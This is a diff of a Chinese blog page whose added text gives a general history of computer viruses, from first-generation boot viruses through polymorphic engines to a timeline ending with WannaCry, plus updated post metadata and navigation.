+<h2 id="潘多拉之盒"><a href="#潘多拉之盒" class="headerlink" title="潘多拉之盒"></a>潘多拉之盒</h2><p>1987-1988年间，此时的病毒仍是一个稀有事物，但这种情形被3个著名的病毒的出现改变了，它们是耶路撒冷，米开朗基罗和醉酒（stoned）。通过媒体的炒作，人们的心理充满了恐惧，开始到处寻求帮助。在这种气氛下，开发反病毒软件的公司如雨后春笋般纷纷冒出。从此，计算机病毒从此步入主流。病毒与反病毒技术也在对抗中发展。这一阶段的流行病毒种类有限，攻击目标单一，清除相对来说较容易，是计算机病毒的萌芽和滋生期，被称为第一代病毒。1988年底，在中国的国家统计部门发现的小球病毒是中国第一次病毒经历。</p>
+<p>1989-1991年间，计算机反病毒技术的提高和反病毒产品的不断涌现，病毒编制者也在不断地总结自己的编程技巧和经验，千方百计地逃避反病毒产品的分析、检测和解毒，从而出现了第二代计算机病毒。第二代病毒又称为混合型病毒（又称为“超级病毒”），它是计算机病毒由简单到复杂，由单纯向成熟的阶段。计算机局域网的应用与普及，再加上网络系统尚未有安全防护的意识，结果出现了病毒第一次流行高峰。这一阶段的病毒攻击目标趋于混合型，一种病毒既可传染磁盘引导扇区，又可传染可执行文件，采取更为隐蔽的方法驻留内存和传染目标。它们往往采取了自我保护措施，增加了检测、解毒的难度。</p>
+<p>1992-1995年间，第三代病毒学会了“变形”，此类病毒称为“多态性”病毒或“自我变形”病毒。所谓“多态性”或“自我变形”的含义是指此类病毒在每次传染目标时，进入宿主程序中的病毒程序大部分都是可变的，即在搜集到同一种病毒的多个样本中，病毒程序的代码绝大多数是不同的，这是此类病毒的重要特点。</p>
+<p>此类病毒的首创者是MarkWashburn，他并不是病毒的有意制造者，而是一位反病毒的技术专家。他编写的1260病毒就是一种多态性病毒，此病毒1990年1月问世，有极强的传染力，被传染的文件被加密，每次传染时都更换加密密钥，而且病毒程序都进行了相当大的改动。他将此类病毒散发给他的同事，目的是为了证明特征代码检测法不是在任何场合下都是有效的。然而，不幸的是，为研究病毒而发明的此种病毒超出了反病毒的技术范围，流入了病毒技术中。<br>　　<br>1992年上半年，在保加利亚发现了黑夜复仇者（DarkAvenger）病毒的变种“MutationDarkAvenger”。这是世界上最早发现的多态性的实战病毒，它可用独特的加密算法产生几乎无限数量的不同形态的同一病毒。<br>上世纪90年代中后期，远程网、远程访问服务的开通，病毒流行面更加广泛，病毒的流行迅速突破地域限制，首先通过广域网传播至局域网内，再在局域网内传播扩散。1996年下半年随着国内Internet的大量普及，Email的使用，夹杂于Email内的WORD宏病毒成为病毒的主流。<br>　　<br>这一时期的病毒的最大特点是利用Internet作为其主要传播途径，传播快、隐蔽性强、破坏性大。网络的发展使得病毒的传播速度大大提高，感染的范围也越来越广。可以说，网络化带来了计算机病毒传染的“高效率”。另外，病毒的主动性、独立性更强了，变形（变种）速度极快并向混合型、多样化发展。</p>
+<p><img src="http://www.bbvdd.com/d/20180910202259n0k.jpeg" alt="病毒"></p>
+<h2 id="病毒陈列室"><a href="#病毒陈列室" class="headerlink" title="病毒陈列室"></a>病毒陈列室</h2><p>1982年——在APPLE-II的计算机中发现Elk  cloner<br>1986年——第一个PC病毒：Brain virus<br>1987年——“李海”(Lehigh)病毒最早在美国的李海大学(Lehigh University)被发现。<br>1988年——Morris Internet worm——感染了6000多台（蠕虫病毒，特点）<br>1989年——“黑暗复仇者”(Dark Avenger)/“埃迪”(Eddie)病毒是最早的反杀毒软件病毒<br>1989年——“费雷多”(Frodo)病毒出现。这个病毒感染文件后具有一定隐蔽性<br>1990年——virus construction set——病毒生产机<br>1990年——加壳病毒(Armored Virus)首次出现。此类病毒很难分解。如 Whale病毒。<br>1991年——Tequila病毒出现<br>1992年——DAMN病毒由Dark Avenger Mutation Engine编写<br>1992年——Michelangelo病毒出现后感染所有类型的磁碟。<br>1993年——出现的Satanbug/Little Loc/Natas病毒<br>1994年——Good Times（joys）<br>1995年——首次发现macro virus<br>1996年——netcat的UNIX版发布(nc)<br>1996年——Laroux/Excel宏病毒<br>1998年——第一个java virus（StrangeBrew）<br>1998年——netcat的Windows版发布<br>1998年——back orifice（BO）/CIH<br>1999年——Melissa/worm（macrovirus by email）<br>1999年——back orifice（BO）for WIN2k<br>1999年——DOS/DDOS-Denial of Service TFT/trin00<br>1999年——knark内核级rootkit（linux）<br>2000年——love Bug（VBScript）<br>2001年——Code Red-worm（overflow for IIS）<br>2001年——Nimda-worm（IIS/outlook/file share etc.）<br>2002年——setiri后门<br>2002年——SQL slammer（sqlserver）<br>2003年——hudan的steganography工具<br>2003年——MSBlaster/Nachi<br>2004年——MyDoom/Sasser<br>2006年——熊猫烧香<br>2006年——Leap-A/Oompa-A<br>2007年——机器狗病毒<br>2010年——Stuxnet（工业蠕虫）<br>2012年——火焰病毒<br>2017年——WannaCry<br>……</p>
+<h2 id="结束语"><a href="#结束语" class="headerlink" title="结束语"></a>结束语</h2><p>正义和邪恶的斗争是永恒存在的，计算机病毒的发展也必然会促进计算机反病毒技术的发展。从恶意代码的发展史来看，对技术的兴趣和爱好是其发展的源动力。但越来越多迹象表明，物质利益将成为推动计算机病毒发展的最大动力。2017年的“勒索”病毒，更是明目张胆地以勒索钱财为目的。直到2018年9月9日，WannnaCry勒索病毒的幕后黑手才被正式指控。</p>
+<p>如今的恶意代码在功能上，分工也越来越细化，实现的关键技术也在不断的变化。移动端的飞速发展，也给恶意代码创造了新的土壤。未来也将会面临更多的挑战。但所谓魔高一尺，道高一丈，每一次的安全危机，都促使着人们安全意识的提高。</p>
+<p>参考文章：<br><a href="http://news.163.com/17/0611/04/CMKFRE6R00018AOP.html" target="_blank" rel="noopener">http://news.163.com/17/0611/04/CMKFRE6R00018AOP.html</a><br><a href="https://baike.sogou.com/v40108.htm?fromTitle=%E8%8E%AB%E9%87%8C%E6%96%AF%E8%A0%95%E8%99%AB" target="_blank" rel="noopener">https://baike.sogou.com/v40108.htm?fromTitle=%E8%8E%AB%E9%87%8C%E6%96%AF%E8%A0%95%E8%99%AB</a></p>
 
     </article>
     <!-- license  -->
     
         <div class="license-wrapper">
             <p>原文作者: <a href="http://wang66.top">王六六</a>
-            <p>原文链接: <a href="http://wang66.top/2018/ARP毒化.html">http://wang66.top/2018/ARP毒化.html</a>
-            <p>发表日期: <a href="http://wang66.top/2018/ARP毒化.html">八月 25日 2018, 10:30:14 晚上</a>
+            <p>原文链接: <a href="http://wang66.top/2018/HistoryofMCD.html">http://wang66.top/2018/HistoryofMCD.html</a>
+            <p>发表日期: <a href="http://wang66.top/2018/HistoryofMCD.html">九月 10日 2018, 8:25:25 晚上</a>
             <p>版权声明: 本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
         </div>
     
@@ -514,17 +453,12 @@ height:50vh;
     <ul class="post-paginator">
         <li class="next">
             
-                <div class="nextSlogan">Next Post</div>
-                <a href= "/2018/一次恶意PHP脚本初探.html" title= 一次恶意PHP脚本初探 >
-                    <div class="nextTitle">一次恶意PHP脚本初探</div>
-                </a>
-            
         </li>
         <li class="previous">
             
                 <div class="prevSlogan">Previous Post</div>
-                <a href= "/2018/浅析缓冲区溢出.html" title= 浅析缓冲区溢出 >
-                    <div class="prevTitle">浅析缓冲区溢出</div>
+                <a href= "/2018/soyouwantobeahacker.html" title= 所以你想成为黑客？ >
+                    <div class="prevTitle">所以你想成为黑客？</div>
                 </a>
             
         </li>
@@ -687,7 +621,7 @@ top:50vh;
         <div class="toc-catalog">
             <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
         </div>
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#了解网络环境"><span class="toc-number">1.</span> <span class="toc-text">了解网络环境</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#攻击原理"><span class="toc-number">2.</span> <span class="toc-text">攻击原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#进行中间人攻击"><span class="toc-number">3.</span> <span class="toc-text">进行中间人攻击</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Ettercap"><span class="toc-number">4.</span> <span class="toc-text">Ettercap</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#中间人攻击，捕获图片"><span class="toc-number">4.1.</span> <span class="toc-text">中间人攻击，捕获图片</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DNS劫持"><span class="toc-number">4.2.</span> <span class="toc-text">DNS劫持</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#替换HTML代码"><span class="toc-number">4.3.</span> <span class="toc-text">替换HTML代码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#使用sslstrip突破ssl加密"><span class="toc-number">4.4.</span> <span class="toc-text">使用sslstrip突破ssl加密</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#对目标之间进行ARP欺骗"><span class="toc-number">4.5.</span> <span class="toc-text">对目标之间进行ARP欺骗</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#进行cookie劫持登录被欺骗者的腾讯微博。"><span class="toc-number">4.6.</span> <span class="toc-text">进行cookie劫持登录被欺骗者的腾讯微博。</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#arp欺骗攻击的防范"><span class="toc-number">5.</span> <span class="toc-text">arp欺骗攻击的防范</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#摇篮时代"><span class="toc-number">1.</span> <span class="toc-text">摇篮时代</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#熊孩子"><span class="toc-number">2.</span> <span class="toc-text">熊孩子</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#潘多拉之盒"><span class="toc-number">3.</span> <span class="toc-text">潘多拉之盒</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#病毒陈列室"><span class="toc-number">4.</span> <span class="toc-text">病毒陈列室</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#结束语"><span class="toc-number">5.</span> <span class="toc-text">结束语</span></a></li></ol>
     </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
